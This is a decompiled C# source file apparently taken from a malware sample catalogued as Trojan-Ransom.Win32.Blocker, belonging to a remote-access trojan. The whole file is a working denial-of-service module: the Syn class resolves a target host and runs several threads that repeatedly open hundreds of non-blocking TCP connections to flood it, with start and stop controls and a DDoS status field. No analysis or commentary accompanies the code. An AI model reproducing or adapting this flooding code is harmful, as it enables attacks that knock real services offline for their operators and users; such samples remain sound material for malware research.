// Decompiled with JetBrains decompiler
// Type: OpenSource_RAT_Schäding.Syn
// Assembly: Stub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8170AD08-ABA5-4012-BCC7-4CC67D0071A1
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00015-msil\Trojan-Ransom.Win32.Blocker.ikxa-53f746507d13e73a4ea2419189ad7b0070faaf51b1e13192df858b42ac6c25c0.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace OpenSource_RAT_Schäding
{
  internal class Syn
  {
    private static ThreadStart[] _floodingJob;
    private static Thread[] _floodingThread;
    private static IPEndPoint _ipEo;
    private static Syn.SendSyn[] _synClass;
    public static string Host;
    public static bool IsEnabled;
    public static int Port = 80;
    public static int SuperSynSockets = 200;
    public static int Threads = 5;
    public static string DDOSStatus;

    [DebuggerNonUserCode]
    public Syn()
    {
    }

    public static void StartSuperSyn()
    {
      try
      {
        Syn._ipEo = new IPEndPoint(Dns.GetHostEntry(Syn.Host).AddressList[0], Syn.Port);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Syn._ipEo = new IPEndPoint(IPAddress.Parse(Syn.Host), Syn.Port);
        ProjectData.ClearProjectError();
      }
      Syn._floodingThread = new Thread[checked (Syn.Threads - 1 + 1)];
      Syn._floodingJob = new ThreadStart[checked (Syn.Threads - 1 + 1)];
      Syn._synClass = new Syn.SendSyn[checked (Syn.Threads - 1 + 1)];
      int num = checked (Syn.Threads - 1);
      int index = 0;
      while (index <= num)
      {
        Syn._synClass[index] = new Syn.SendSyn(Syn._ipEo, Syn.SuperSynSockets);
        Syn._floodingJob[index] = new ThreadStart(Syn._synClass[index].Send);
        Syn._floodingThread[index] = new Thread(Syn._floodingJob[index]);
        Syn._floodingThread[index].Start();
        checked { ++index; }
      }
      Syn.IsEnabled = true;
    }

    public static void StopSuperSyn()
    {
      int num = checked (Syn.Threads - 1);
      int index = 0;
      while (index <= num)
      {
        try
        {
          Syn._floodingThread[index].Abort();
          Syn._floodingThread[index] = (Thread) null;
          Syn._floodingJob[index] = (ThreadStart) null;
          Syn._synClass[index] = (Syn.SendSyn) null;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        checked { ++index; }
      }
      Syn.IsEnabled = false;
    }

    private class SendSyn
    {
      private Socket[] _sock;
      private IPEndPoint ipEo;
      private int SuperSynSockets;

      public SendSyn(IPEndPoint ipEo, int superSynSockets__1)
      {
        this.ipEo = ipEo;
        this.SuperSynSockets = superSynSockets__1;
      }

      private static void OnConnect(IAsyncResult ar)
      {
      }

      public void Send()
      {
        while (true)
        {
          try
          {
            this._sock = new Socket[checked (this.SuperSynSockets - 1 + 1)];
            int num1 = checked (this.SuperSynSockets - 1);
            int index1 = 0;
            while (index1 <= num1)
            {
              this._sock[index1] = new Socket(this.ipEo.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
              this._sock[index1].Blocking = false;
              this._sock[index1].BeginConnect((EndPoint) this.ipEo, new AsyncCallback(Syn.SendSyn.OnConnect), (object) this._sock[index1]);
              checked { ++index1; }
            }
            Thread.Sleep(100);
            int num2 = checked (this.SuperSynSockets - 1);
            int index2 = 0;
            while (index2 <= num2)
            {
              if (this._sock[index2].Connected)
                this._sock[index2].Disconnect(false);
              this._sock[index2].Close();
              this._sock[index2] = (Socket) null;
              checked { ++index2; }
            }
            this._sock = (Socket[]) null;
          }
          catch (Exception ex1)
          {
            ProjectData.SetProjectError(ex1);
            int num = checked (this.SuperSynSockets - 1);
            int index = 0;
            while (index <= num)
            {
              try
              {
                if (this._sock != null)
                {
                  if (this._sock[index].Connected)
                    this._sock[index].Disconnect(false);
                  this._sock[index].Close();
                  this._sock[index] = (Socket) null;
                }
              }
              catch (Exception ex2)
              {
                ProjectData.SetProjectError(ex2);
                ProjectData.ClearProjectError();
              }
              checked { ++index; }
            }
            ProjectData.ClearProjectError();
          }
        }
      }
    }
  }
}
